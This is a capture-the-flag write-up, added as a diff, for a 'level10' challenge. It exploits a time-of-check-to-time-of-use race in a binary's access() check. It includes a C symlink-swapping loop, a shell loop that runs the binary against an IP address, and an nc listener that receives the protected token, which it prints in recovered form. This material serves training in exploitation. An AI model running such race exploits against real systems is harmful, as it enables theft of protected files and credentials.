@@ -1,0 +1,70 @@
+we have 2 files:
+- level10 binary
+- token which seems to be a text file, we dont have access to it
+
+./level10 gives the instruction: "sends file to host if you have access to it"
+
+If I try ./level10 token 172.16.254.1, we have: "You don't have access to token"
+
+Lets try ltrace, we see that the bin uses access:
+
+------
+__libc_start_main(0x80486d4, 3, 0xbffff6d4, 0x8048970, 0x80489e0 <unfinished ...>
+access("token", 4)                                              = -1
+printf("You don't have access to %s\n", "token"You don't have access to token
+)                = 31
++++ exited (status 31) +++'
+-----------
+
+So lets read the access man !
+
+Foubd in access man:
+-------
+Avertissement : Utiliser access() pour vérifier si un utilisateur a le droit,
+ par exemple, d'ouvrir un fichier avant d'effectuer réellement l'ouverture 
+ avec open(2), risque de créer un trou de sécurité. En effet, 
+ l'utilisateur peut exploiter le petit intervalle de temps entre la vérification 
+ et l'accès pour modifier le fichier (via un lien symbolique en général). 
+ Pour cette raison, l'utilisation de cet appel système devrait être évitée. 
+-------
+
+Thus, a hack can be to create a ln to a file where we have rights ans quickly change this ln to token file
+
+void main()
+{
+	int i = 10000;
+	while(i)
+	{
+		system("ln -s /tmp/f/test /tmp/f/file"); // /tmp/f/test is an empty file with access rights
+		system("rm -rf /tmp/f/file");
+		system("ln -s ~/token /tmp/f/file");
+		system("rm -rf /tmp/f/file");
+	}
+}
+
+
+Then launch 2 more shell:
+One with nc to get message sent by the level10 bin
+the other to launch a loop over the bin: "while true; do ./level10 /tmp/f/file 172.16.254.130; done;"
+
+Then launch the /tmp/f/a.out to loop the symbolic links
+
+
+We have on the nc shell:
+[...]
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+[...]
+
+
+pw decoded: woupa2yuojeeaaed06riuj63c
+
+dadada !
+
+See flag in flag file
